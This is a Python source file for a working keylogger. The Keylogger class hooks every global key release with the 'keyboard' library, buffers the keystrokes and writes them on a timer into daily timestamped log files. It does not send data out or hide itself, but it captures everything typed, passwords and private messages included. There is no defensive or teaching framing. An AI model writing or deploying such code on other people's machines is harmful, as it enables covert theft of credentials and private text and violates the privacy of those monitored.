from threading import Timer
from datetime import datetime
import keyboard
import os


class Keylogger:

    def __init__(self, interval, log_directory):

        self.interval = interval
        self.log = ""
        self.current_day = datetime.today().strftime('%Y-%m-%d')
        self.filename = ""
        self.__create_filename()
        self.file_directory = f"{log_directory}/{self.current_day}/"
        self.current_log_path = f"{self.file_directory}{self.filename}.txt"

    def start(self):
        # create base log file
        self.__create_log()
        # start the keylogger
        keyboard.on_release(callback=self.__callback)
        # begins logging
        self.__report()
        # block the current thread, wait until CTRL+C is pressed
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            print("Exiting Application")

    def __callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER] "
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = "[BACKSPACE]"
            elif name == "ctrl":
                name = "[CTRL]"
            elif name == "f1":
                name = "[F1]"
            elif name == "f2":
                name = "[F2]"
            elif name == "f3":
                name = "[F3]"
            elif name == "f4":
                name = "[F4]"
            elif name == "f5":
                name = "[F5]"
            elif name == "f6":
                name = "[F6]"
            elif name == "f7":
                name = "[F7]"
            elif name == "f8":
                name = "[F8]"
            elif name == "f9":
                name = "[F9]"
            elif name == "f10":
                name = "[F10]"
            elif name == "f11":
                name = "[F11]"
            elif name == "f12":
                name = "[F12]"

        self.log += name

    # updates the filename to the current date
    def __create_filename(self):
        self.current_day = datetime.today().strftime('%Y-%m-%d')
        self.filename = f"keylog-{self.current_day}"

    # checks if date has changed and updates filename
    def __update_logfile(self):
        if datetime.today().strftime('%Y-%m-%d') != self.current_day:
            self.__create_filename()
            self.__create_log()

    def __report_to_file(self):
        # append to daily logfile
        with open(self.current_log_path, "a") as f:
            # write the keylogs to the file
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} : {self.log} \n", file=f)
        print(f"[+] Saved {self.filename}.txt")

    def __report(self):
        if self.log:
            # creates a new log file if the date has changed since the last update.
            # only relevant if the keylogger is running for several days.
            self.__update_logfile()
            self.__report_to_file()
            # keystrokes in self.log have been written to file so can be emptied
            self.log = ""

        # recursively calls this function every x seconds
        timer = Timer(interval=self.interval, function=self.__report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def __create_log(self):
        try:
            if not os.path.exists(self.file_directory):
                os.makedirs(self.file_directory)
            open(self.current_log_path, "a")
            print(f"Log file created: {self.filename}")
        except FileExistsError:
            print(FileExistsError.filename + " attempted recreation")
